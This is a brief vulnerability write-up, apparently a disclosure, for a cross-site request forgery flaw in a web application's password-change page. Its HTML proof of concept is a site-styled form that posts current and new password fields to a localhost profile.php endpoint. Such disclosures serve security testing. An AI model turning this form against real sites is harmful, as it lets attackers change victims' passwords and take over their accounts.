# Change Password CSRF
Allows for a users password to be changed through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="LAYER_form" action="http://localhost/profile.php/cmd/password" method="POST" style="padding: 35px;">
    <label for="current_password">Current Password</label>
    <input type="password" name="current_password" id="current_password">
    <label for="new_password">New Password</label>
    <input type="password" name="new_password" id="new_password">
    <br><br>
    <input type="submit" name="edit" value="Save Changes">
</form>
```
